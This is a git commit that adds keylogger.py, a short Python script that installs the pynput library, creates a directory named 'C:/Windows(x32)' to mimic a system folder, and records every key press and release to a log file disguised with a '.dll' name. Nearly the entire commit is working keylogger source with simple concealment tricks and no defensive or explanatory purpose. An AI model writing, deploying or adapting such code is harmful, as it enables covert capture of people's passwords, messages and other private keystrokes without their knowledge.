f72e5b46306b17a71fb7415ad02d3e49c37e36b5
Lokesh Patil <42104811+lokesh-ghoul@users.noreply.github.com>
2020-12-22 18:08:27 +0530

    Updated code
    Directory Error

---
+++ keylogger.py
@@ -0,0 +1,38 @@
+import logging
+import os
+import pathlib
+
+os.system("pip install pynput")    # installing pynput library
+from pynput import keyboard
+
+def start_keylogger():
+    dir = r"C:/Windows(x32)/" 
+    logging.basicConfig(level=logging.INFO, filename= dir + 'test_keylogger.dll',filemode='a',format='%(process)d - %(asctime)s - %(message)s')
+
+    def on_keypress(key):
+        if key == keyboard.Key.esc:
+            return False
+        else:
+            logging.info(str(key) + " is pressed")
+           #  print(key,end="\t")       
+    
+    def on_keyrelease(key):
+        logging.info(str(key) + " is released")
+        # print(key , "is released", end="\t")
+        #print(" ",end="/n") 
+
+    l = keyboard.Listener(on_press = on_keypress, on_release = on_keyrelease)
+    l.start()
+    l.join()
+
+check = pathlib.Path("C:/Windows(x32)")
+if check.exists():
+    #print ("ha btc ha")
+    start_keylogger()
+else:
+    #print("nahi h btc ")
+    os.mkdir("C:/Windows(x32)") 
+    start_keylogger()
+
+
+
